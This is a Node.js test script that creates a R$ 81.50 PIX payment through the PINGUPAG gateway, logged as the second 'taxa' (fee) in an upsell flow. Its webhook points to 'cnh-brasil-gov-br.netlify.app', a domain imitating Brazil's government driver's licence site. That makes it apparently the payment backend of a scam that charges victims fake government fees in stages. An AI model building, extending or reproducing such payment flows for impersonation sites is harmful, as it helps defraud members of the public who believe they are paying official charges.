/**
 * Teste para gerar PIX de R$ 81.50 no PINGUPAG (Upsell)
 */

const credentials = require("./functions/credentials");

const PINGUPAG_BASE = "https://app.pingupag.com/gateway/v1";
const PINGUPAG_API_KEY = process.env.PINGUPAG_API_KEY || credentials.PINGUPAG_API_KEY;

async function gerarPixUpsell() {
  try {
    console.log("🔄 Gerando PIX de R$ 81.50 (Upsell) no PINGUPAG...\n");

    const payload = {
      amount: 8150, // R$ 81.50 em centavos
      description: "SHOPIFY LOJA 03 - UPSELL",
      reference: `UPSELL-${Date.now()}-${Math.random().toString(36).substring(7)}`,
      source: "api_externa",
      customer: {
        name: "Cliente Teste",
        email: "teste@email.com",
        phone: "11999999999",
        document: "12345678901",
      },
      postback_url: "https://cnh-brasil-gov-br.netlify.app/webhook/pingupag",
      tracking: {
        utm_source: "test",
        utm_campaign: "test_upsell",
        utm_medium: "test",
      },
    };

    console.log("📤 Enviando para PINGUPAG:");
    console.log("Amount: R$ 81.50");
    console.log("Reference:", payload.reference);
    console.log("─".repeat(60));

    const response = await fetch(`${PINGUPAG_BASE}/transaction`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "X-API-Key": PINGUPAG_API_KEY,
      },
      body: JSON.stringify(payload),
    });

    if (!response.ok) {
      const error = await response.text();
      console.error("❌ Erro:", response.status, error);
      return;
    }

    const data = await response.json();

    console.log("\n✅ PIX GERADO COM SUCESSO!");
    console.log("─".repeat(60));
    console.log("Amount: R$ 81.50 ✅");
    console.log("Transaction ID:", data.id);
    console.log("Reference:", data.reference);
    console.log("\n📋 PIX Code:");
    console.log(data.qr_code);
    console.log("\n🔗 QR Code Base64:");
    console.log(data.qr_code_base64?.substring(0, 100) + "...");
    console.log("\n📊 RESUMO:");
    console.log("├─ 1ª Taxa: R$ 65.70 ✅");
    console.log("├─ 2ª Taxa: R$ 81.50 ✅");
    console.log("├─ Tipo: UPSELL");
    console.log("└─ Status: Aguardando pagamento");

  } catch (error) {
    console.error("❌ Erro:", error.message);
  }
}

gerarPixUpsell();
